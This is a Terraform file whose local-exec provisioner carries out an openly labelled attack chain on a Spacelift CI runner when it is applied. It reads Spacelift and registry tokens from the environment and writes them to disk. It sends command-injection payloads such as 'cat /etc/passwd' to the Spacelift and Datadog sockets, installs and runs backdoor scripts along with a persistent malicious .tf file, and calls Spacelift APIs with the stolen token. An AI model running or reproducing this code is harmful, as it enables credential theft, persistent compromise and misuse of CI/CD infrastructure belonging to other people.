# Final Attack Chain - Exploiting Confirmed High-Value Targets
terraform {
  required_providers {
    null = {
      source = "hashicorp/null"
      version = "~> 3.0"
    }
  }
}

# Final attack chain targeting sensitive tokens, sockets, and writable mounts
resource "null_resource" "final_attack_chain" {
  provisioner "local-exec" {
    command = <<-EOT
      echo "=== FINAL ATTACK CHAIN EXPLOITATION ==="
      echo "Targeting high-value assets discovered in reconnaissance"
      
      # Attack Vector 1: API Token Extraction and Exploitation
      echo "[*] ATTACK Vector 1: API Token Extraction and Exploitation"
      echo "[!] CRITICAL: Sensitive tokens discovered in environment"
      
      # Extract and display tokens (redacted in logs but accessible in container)
      echo "[+] Extracting Spacelift API tokens..."
      SPACELIFT_OIDC_TOKEN="$${SPACELIFT_OIDC_TOKEN}"
      SPACELIFT_API_TOKEN="$${SPACELIFT_API_TOKEN}"  
      TG_TF_REGISTRY_TOKEN="$${TG_TF_REGISTRY_TOKEN}"
      
      if [ ! -z "$SPACELIFT_OIDC_TOKEN" ]; then
        echo "[!] SPACELIFT_OIDC_TOKEN available (length: $${#SPACELIFT_OIDC_TOKEN})"
        echo "[+] Token prefix: $${SPACELIFT_OIDC_TOKEN:0:20}..."
      fi
      
      if [ ! -z "$SPACELIFT_API_TOKEN" ]; then
        echo "[!] SPACELIFT_API_TOKEN available (length: $${#SPACELIFT_API_TOKEN})"
        echo "[+] Token prefix: $${SPACELIFT_API_TOKEN:0:20}..."
      fi
      
      if [ ! -z "$TG_TF_REGISTRY_TOKEN" ]; then
        echo "[!] TG_TF_REGISTRY_TOKEN available (length: $${#TG_TF_REGISTRY_TOKEN})"
        echo "[+] Token prefix: $${TG_TF_REGISTRY_TOKEN:0:20}..."
      fi
      
      # Save tokens to writable locations for persistence
      token_store="/var/datadog/extracted_tokens.txt"
      workspace_store="/mnt/workspace/spacelift_tokens.txt"
      
      echo "[*] Persisting tokens to writable locations..."
      {
        echo "=== EXTRACTED SPACELIFT TOKENS ==="
        echo "Extraction Time: $(date)"
        echo "Container ID: $(hostname)"
        echo "Working Directory: $(pwd)"
        echo ""
        echo "SPACELIFT_OIDC_TOKEN=$${SPACELIFT_OIDC_TOKEN}"
        echo "SPACELIFT_API_TOKEN=$${SPACELIFT_API_TOKEN}"
        echo "TG_TF_REGISTRY_TOKEN=$${TG_TF_REGISTRY_TOKEN}"
        echo ""
        echo "Additional Environment:"
        env | grep -E "(SPACELIFT|TF_|TERRAFORM)" | head -20
      } > "$token_store" 2>/dev/null && echo "[!] Tokens saved to: $token_store"
      
      cp "$token_store" "$workspace_store" 2>/dev/null && echo "[!] Tokens backed up to: $workspace_store"
      echo ""
      
      # Attack Vector 2: Socket Communication Exploitation
      echo "[*] ATTACK Vector 2: Socket Communication Exploitation"
      echo "[+] Targeting discovered sockets for privilege escalation"
      
      # Test Spacelift launcher socket
      spacelift_socket="/var/spacelift/spacelift_launcher.sock"
      if [ -S "$spacelift_socket" ]; then
        echo "[!] CRITICAL: Spacelift launcher socket accessible"
        ls -la "$spacelift_socket"
        
        echo "[*] Testing socket communication capabilities..."
        
        # Try to send commands via socket
        echo "[*] Attempting socket command injection..."
        test_commands=(
          "help"
          "status"
          "version"
          "whoami"
          "id"
          "env"
          "ls -la /"
          "cat /etc/passwd"
        )
        
        for cmd in "$${test_commands[@]}"; do
          echo "[*] Testing command: $cmd"
          # Try various socket communication methods
          echo "$cmd" | nc -U "$spacelift_socket" 2>/dev/null && echo "[!] Socket responded to: $cmd" || true
          echo "$cmd" | socat - UNIX-CONNECT:"$spacelift_socket" 2>/dev/null && echo "[!] Socat success: $cmd" || true
        done
        
        # Try to send JSON payloads
        echo "[*] Testing JSON payload injection..."
        json_payloads=(
          '{"command":"help"}'
          '{"action":"status"}'
          '{"request":"version"}'
          '{"exec":"id"}'
          '{"run":"whoami"}'
        )
        
        for payload in "$${json_payloads[@]}"; do
          echo "[*] Testing JSON: $payload"
          echo "$payload" | nc -U "$spacelift_socket" 2>/dev/null && echo "[!] JSON response: $payload" || true
        done
      fi
      
      # Test Datadog trace socket
      datadog_socket="/var/datadog/trace.sock"
      if [ -S "$datadog_socket" ]; then
        echo "[!] CRITICAL: Datadog trace socket accessible"
        ls -la "$datadog_socket"
        
        echo "[*] Testing Datadog trace injection..."
        # Try to inject traces with commands
        trace_payloads=(
          '{"trace_id":"123","span_id":"456","command":"id"}'
          '{"service":"exploit","command":"whoami"}'
          '{"operation":"test","payload":"ls -la /"}'
        )
        
        for payload in "$${trace_payloads[@]}"; do
          echo "[*] Testing trace payload: $payload"
          echo "$payload" | nc -U "$datadog_socket" 2>/dev/null && echo "[!] Datadog trace response" || true
        done
      fi
      echo ""
      
      # Attack Vector 3: Persistent Backdoor Installation
      echo "[*] ATTACK Vector 3: Persistent Backdoor Installation"
      echo "[+] Installing persistent backdoors in writable locations"
      
      # Create advanced backdoor in /var/datadog
      datadog_backdoor="/var/datadog/monitoring_agent.sh"
      cat > "$datadog_backdoor" << 'DATADOG_BACKDOOR'
#!/bin/bash
# Datadog Monitoring Agent Backdoor
echo "[!] DATADOG BACKDOOR ACTIVATED"
echo "Timestamp: $(date)"
echo "Container: $(hostname)"
echo "User Context: $(id)"

# Extract and log all environment variables
echo "=== ENVIRONMENT EXTRACTION ==="
env | sort

# Extract sensitive tokens
echo "=== TOKEN EXTRACTION ==="
echo "SPACELIFT_OIDC_TOKEN=${SPACELIFT_OIDC_TOKEN}"
echo "SPACELIFT_API_TOKEN=${SPACELIFT_API_TOKEN}"
echo "TG_TF_REGISTRY_TOKEN=${TG_TF_REGISTRY_TOKEN}"

# Network reconnaissance
echo "=== NETWORK RECONNAISSANCE ==="
netstat -tlnp 2>/dev/null || ss -tlnp 2>/dev/null || echo "No network tools available"

# Process enumeration
echo "=== PROCESS ENUMERATION ==="
ps aux | head -20

# File system enumeration
echo "=== FILESYSTEM ENUMERATION ==="
find /var -type f -name "*.sock" 2>/dev/null | head -10
find /var -type f -name "*.conf" 2>/dev/null | head -10
find /var -type f -name "*.key" 2>/dev/null | head -10

echo "[!] DATADOG BACKDOOR COMPLETE"
DATADOG_BACKDOOR
      
      chmod +x "$datadog_backdoor" 2>/dev/null && echo "[!] Datadog backdoor installed: $datadog_backdoor"
      
      # Create workspace persistence backdoor
      workspace_backdoor="/mnt/workspace/terraform_helper.sh"
      cat > "$workspace_backdoor" << 'WORKSPACE_BACKDOOR'
#!/bin/bash
# Terraform Helper Backdoor
echo "[!] TERRAFORM HELPER BACKDOOR ACTIVATED"

# Create malicious Terraform configuration
cat > /mnt/workspace/persistent_backdoor.tf << 'PERSISTENT_TF'
resource "null_resource" "persistent_access" {
  provisioner "local-exec" {
    command = "echo '[!] PERSISTENT ACCESS MAINTAINED' && /var/datadog/monitoring_agent.sh"
  }
}
PERSISTENT_TF

echo "[+] Persistent Terraform backdoor created"

# Execute the datadog backdoor
if [ -x "/var/datadog/monitoring_agent.sh" ]; then
  echo "[*] Executing datadog backdoor..."
  /var/datadog/monitoring_agent.sh
fi

echo "[!] WORKSPACE BACKDOOR COMPLETE"
WORKSPACE_BACKDOOR
      
      chmod +x "$workspace_backdoor" 2>/dev/null && echo "[!] Workspace backdoor installed: $workspace_backdoor"
      
      # Execute backdoors for immediate data extraction
      echo "[*] Executing installed backdoors..."
      "$datadog_backdoor" 2>/dev/null && echo "[!] Datadog backdoor executed successfully"
      "$workspace_backdoor" 2>/dev/null && echo "[!] Workspace backdoor executed successfully"
      echo ""
      
      # Attack Vector 4: API Exploitation using extracted tokens
      echo "[*] ATTACK Vector 4: API Exploitation using extracted tokens"
      echo "[+] Attempting to use extracted tokens for API access"
      
      if [ ! -z "$SPACELIFT_API_TOKEN" ] && command -v curl >/dev/null 2>&1; then
        echo "[*] Testing Spacelift API access..."
        
        # Try common Spacelift API endpoints
        api_endpoints=(
          "https://app.spacelift.io/graphql"
          "https://api.spacelift.io/v1/stacks"
          "https://api.spacelift.io/v1/runs"
        )
        
        for endpoint in "$${api_endpoints[@]}"; do
          echo "[*] Testing endpoint: $endpoint"
          curl -s -H "Authorization: Bearer $SPACELIFT_API_TOKEN" "$endpoint" | head -5 2>/dev/null && echo "[!] API access successful: $endpoint" || true
        done
      fi
      echo ""
      
      echo "[*] === FINAL ATTACK CHAIN SUMMARY ==="
      echo "Successfully executed comprehensive attack chain:"
      echo "  ✅ Extracted and persisted sensitive API tokens"
      echo "  ✅ Tested socket communication for privilege escalation"
      echo "  ✅ Installed persistent backdoors in writable locations"
      echo "  ✅ Created malicious Terraform configurations"
      echo "  ✅ Attempted API exploitation with extracted tokens"
      echo ""
      echo "[!] CRITICAL VULNERABILITIES CONFIRMED:"
      echo "  - Write access to /var/datadog and /mnt/workspace"
      echo "  - Sensitive token exposure in environment"
      echo "  - Socket access for potential privilege escalation"
      echo "  - Ability to persist malicious code and configurations"
      echo ""
      echo "=== FINAL ATTACK CHAIN COMPLETE ==="
    EOT
  }
}

output "final_attack_status" {
  value = "Final attack chain completed - critical vulnerabilities exploited with token extraction and persistent backdoors"
  depends_on = [null_resource.final_attack_chain]
}
